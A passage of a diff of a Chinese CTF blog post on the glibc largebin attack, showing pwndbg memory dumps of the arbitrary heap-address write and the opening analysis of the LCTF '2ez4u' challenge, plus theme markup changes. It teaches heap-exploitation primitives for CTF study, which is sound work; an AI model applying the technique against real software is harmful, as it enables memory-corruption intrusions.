x/<span class="number">10</span>gx victim</span><br><span class="line"><span class="number">0x6033a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x6033b0</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x6033c0</span>:	<span class="number">0x0000000000602840</span>	<span class="number">0x00007fffffffdd10</span></span><br><span class="line"><span class="number">0x6033d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6033e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p victim-&gt;bk_nextsize</span><br><span class="line">$<span class="number">24</span> = (struct malloc_chunk *) <span class="number">0x7fffffffdd10</span></span><br><span class="line">pwndbg&gt; p victim-&gt;bk_nextsize-&gt;fd_nextsize </span><br><span class="line">$<span class="number">25</span> = (struct malloc_chunk *) <span class="number">0x6033a0</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7fffffffdd10</span></span><br><span class="line"><span class="number">0x7fffffffdd10</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd20</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd30</span>:	<span class="number">0x00000000006033a0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd40</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd50</span>:	<span class="number">0x00007fffffffde40</span>	<span class="number">0xb2b6b91675857a00</span></span><br></pre></td></tr></table></figure>
+<pre><code class="c">victim = p11  //0x6033a0
+fwd = p3 //0x602840
+操作前的victim
+pwndbg&gt; x/10gx 0x6033a0
+0x6033a0:    0x0000000000000000    0x0000000000000411
+0x6033b0:    0x0000000000603290    0x00007ffff7dd1b78
+0x6033c0:    0x0000000000000000    0x0000000000000000
+0x6033d0:    0x0000000000000000    0x0000000000000000
+0x6033e0:    0x0000000000000000    0x0000000000000000
+
+
+进行下面的操作
+else
+{
+     victim-&gt;fd_nextsize = fwd;
+     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
+     fwd-&gt;bk_nextsize = victim;
+     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; // 这一步会往stack上写入victim的地址
+}
+bck = fwd-&gt;bk;
+
+操作完后victim的内容
+pwndbg&gt; x/10gx victim
+0x6033a0:    0x0000000000000000    0x0000000000000411
+0x6033b0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
+0x6033c0:    0x0000000000602840    0x00007fffffffdd10
+0x6033d0:    0x0000000000000000    0x0000000000000000
+0x6033e0:    0x0000000000000000    0x0000000000000000
+pwndbg&gt; p victim-&gt;bk_nextsize
+$24 = (struct malloc_chunk *) 0x7fffffffdd10
+pwndbg&gt; p victim-&gt;bk_nextsize-&gt;fd_nextsize 
+$25 = (struct malloc_chunk *) 0x6033a0
+pwndbg&gt; x/10gx 0x7fffffffdd10
+0x7fffffffdd10:    0x0000000000000000    0x0000000000000000
+0x7fffffffdd20:    0x0000000000000000    0x0000000000000000
+0x7fffffffdd30:    0x00000000006033a0    0x0000000000000000
+0x7fffffffdd40:    0x0000000000000000    0x0000000000000000
+0x7fffffffdd50:    0x00007fffffffde40    0xb2b6b91675857a00
+</code></pre>
 <h4 id="伪造large-chunk，并分配出来"><a href="#伪造large-chunk，并分配出来" class="headerlink" title="伪造large chunk，并分配出来"></a>伪造large chunk，并分配出来</h4><p>图片来源 ： <a href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">veritas501大佬博客</a></p>
-<p><img src="/picture/1555415505300.png" alt="1555415505300"></p>
+<p><img src="/picture/1555415505300.png" srcset="/img/loading.gif" alt="1555415505300"></p>
 <p>通过修改largebin中的chunk的 bk_nextsize字段为伪造的largechunk，使得伪造的largechunk被链入    largebin中，同时伪造的largechunk要能bypass  unlink的check 才能被分配出来。</p>
-<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="LCTF-2ez4u"><a href="#LCTF-2ez4u" class="headerlink" title="LCTF - 2ez4u"></a>LCTF - 2ez4u</h4><h5 id="防护机制"><a href="#防护机制" class="headerlink" title="防护机制"></a>防护机制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">☁  2ez4u [master] ⚡  checksec 2ez4u </span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">[*] &apos;/home/zs0zrc/pwn/how2heap/largebin_attack/2ez4u/2ez4u&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<p>简单运行下，发现是个常规的菜单题。它一共有4个功能，添加、删除、修改、打印 。</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="LCTF-2ez4u"><a href="#LCTF-2ez4u" class="headerlink" title="LCTF - 2ez4u"></a>LCTF - 2ez4u</h4><h5 id="防护机制"><a href="#防护机制" class="headerlink" title="防护机制"></a>防护机制</h5><pre><code>☁  2ez4u [master] ⚡  checksec 2ez4u 
+[*] Checking for new versions of pwntools
+[*] &#39;/home/zs0zrc/pwn/how2heap/largebin_attack/2ez4u/2ez4u&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre><p>简单运行下，发现是个常规的菜单题。它一共有4个功能，添加、删除、修改、打印 。</p>
 <p>程序中存在的一个结构体</p>
 <p><code>apple</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct apple</span><br><span class="line">&#123;</span><br><span class="line">    int color;</span><br><span class="line">    int num;   </span><br><span class="line">    unsigned long value;</span><br><span class="line">    int index;</span><br><span class="line">    int size;</span><br><span class="line">    char description[size];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>下面分析下程序的具体功能</p>
+<pre><code>struct apple
+{
+    int color;
+    int num;   
+    unsigned long value;
+    int index;
+    int size;
+    char description[size];
+}
+</code></pre><p>下面分析下程序的具体功能</p>
 <p>add功能</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> color; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> value; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  apples *apple; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"sorry XD"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"color?(0:red, 1:green):"</span>);</span><br><span class="line">    color = read_num();</span><br><span class="line">    <span class="keyword">if</span> ( color != <span class="number">1</span> &amp;&amp; color )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"value?(0-999):"</span>);</span><br><span class="line">      value = read_num();</span><br><span class="line">      <span class="keyword">if</span> ( value &lt;= <span class="number">999</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"num?(0-16):"</span>);</span><br><span class="line">        v4 = read_num();</span><br><span class="line">        <span class="keyword">if</span> ( v4 &lt;= <span class="number">0x10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"description length?(1-1024):"</span>);</span><br><span class="line">          size = read_num();</span><br><span class="line">          <span class="keyword">if</span> ( size &lt;= <span class="number">0x400</span> &amp;&amp; size )</span><br><span class="line">          &#123;</span><br><span class="line">            apple = <span class="built_in">malloc</span>(size + <span class="number">0x18</span>LL);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"description of the apple:"</span>);</span><br><span class="line">            read_content(apple-&gt;des, size, <span class="number">10</span>);</span><br><span class="line">            apple-&gt;color = color;</span><br><span class="line">            apple-&gt;values = value;</span><br><span class="line">            apple-&gt;num = v4;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( !*(&amp;<span class="built_in">array</span> + <span class="number">4</span> * i) )</span><br><span class="line">              &#123;</span><br><span class="line">                apple-&gt;index = i;</span><br><span class="line">                *(&amp;<span class="built_in">array</span> + <span class="number">2</span> * i + <span class="number">1</span>) = apple;</span><br><span class="line">                *(&amp;<span class="built_in">array</span> + <span class="number">4</span> * i + <span class="number">1</span>) = size;</span><br><span class="line">                *(&amp;<span class="built_in">array</span> + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">                ++count;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"apple index: %d\n"</span>, i);</span><br><span class="line">                <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"???"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">unsigned __int64 add()
+{
+  int i; // [rsp+4h] [rbp-2Ch]
+  int color; // [rsp+8h] [rbp-28h]
+  unsigned int value; // [rsp+Ch] [rbp-24h]
+  unsigned int v4; // [rsp+10h] [rbp-20h]
+  unsigned int size; // [rsp+14h] [rbp-1Ch]
+  apples *apple; // [rsp+18h] [rbp-18h]
+  unsigned __int64 v7; // [rsp+28h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  if ( count == 16 )
+  {
+    puts(&quot;sorry XD&quot;);
+  }
+  else
+  {
+    printf(&quot;color?(0:red, 1:green):&quot;);
+    color = read_num();
+    if ( color != 1 &amp;&amp; color )
+    {
+      puts(&quot;invalid&quot;);
+    }
+    else
+    {
+      printf(&quot;value?(0-999):&quot;);
+      value = read_num();
+      if ( value &lt;= 999 )
+      {
+        printf(&quot;num?(0-16):&quot;);
+        v4 = read_num();
+        if ( v4 &lt;= 0x10 )
+        {
+          printf(&quot;description length?(1-1024):&quot;);
+          size = read_num();
+          if ( size &lt;= 0x400 &amp;&amp; size )
+          {
+            apple = malloc(size + 0x18LL);
+            printf(&quot;description of the apple:&quot;);
+            read_content(apple-&gt;des, size, 10);
+            apple-&gt;color = color;
+            apple-&gt;values = value;
+            apple-&gt;num = v4;
+            for ( i = 0; i &lt;= 15; ++i )
+            {
+              if ( !*(&amp;array + 4 * i) )
+              {
+                apple-&gt;index = i;
+                *(&amp;array + 2 * i + 1) = apple;
+                *(&amp;array + 4 * i + 1) = size;
+                *(&amp;array + 4 * i) = 1;
+                ++count;
+                printf(&quot;apple index: %d\n&quot;, i);
+                return __readfsqword(0x28u) ^ v7;
+              }
+            }
+          }
+          else
+          {
+            puts(&quot;???&quot;);
+          }
+        }
+        else
+        {
+          puts(&quot;invalid&quot;);
+        }
+      }
+      else
+      {
+        puts(&quot;invalid&quot;);
+      }
+    }
+  }
+  return __readfsqword(0x28u) ^ v7;
+}
+</code></pre>
 <p>程序最多添加16个apple，同时apple的size和地址存储在bss段上的一个全局变量数组中。</p>
 <h4 id="heapstrom2"><a href="#heapstrom2" class="headerlink" title="heapstrom2"></a>heapstrom2</h4><p>0ctf2018的一道题，质量十分好。</p>
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-      <div>
-        
-
-
-
-
-  
-
-
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2019/04/16/2019-4-16-largebin-attack/" title="largebin attack">http://yoursite.com/2019/04/16/2019-4-16-largebin-attack/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-            <a href="/tags/largebin/" rel="tag"># largebin</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/03/26/2019-3-26-0CTFTCTF2019-PWN-复现/" rel="next" title="0CTF/TCTF2019 PWN 复现">
-                <i class="fa fa-chevron-left"></i> 0CTF/TCTF2019 PWN 复现
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/05/11/2019-5-11-CVE-2016-4622-(2016-10-27)的简单复现/" rel="prev" title="CVE-2016-4622复现">
-                CVE-2016-4622复现 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+            </div>
+            <hr>
+            <div>
+              <p>
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/largebin/">largebin</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
 
             
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#large-bin-attack原理"><span class="nav-number">2.</span> <span class="nav-text">large bin attack原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#往任意地址写堆地址"><span class="nav-number">2.1.</span> <span class="nav-text">往任意地址写堆地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#伪造large-chunk，并分配出来"><span class="nav-number">2.2.</span> <span class="nav-text">伪造large chunk，并分配出来</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目"><span class="nav-number">3.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LCTF-2ez4u"><span class="nav-number">3.1.</span> <span class="nav-text">LCTF - 2ez4u</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#防护机制"><span class="nav-number">3.1.1.</span> <span class="nav-text">防护机制</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#heapstrom2"><span class="nav-number">3.2.</span> <span class="nav-text">heapstrom2</span></a></li></ol></li></ol></div>
-            
-
           </div>
         </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
       </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
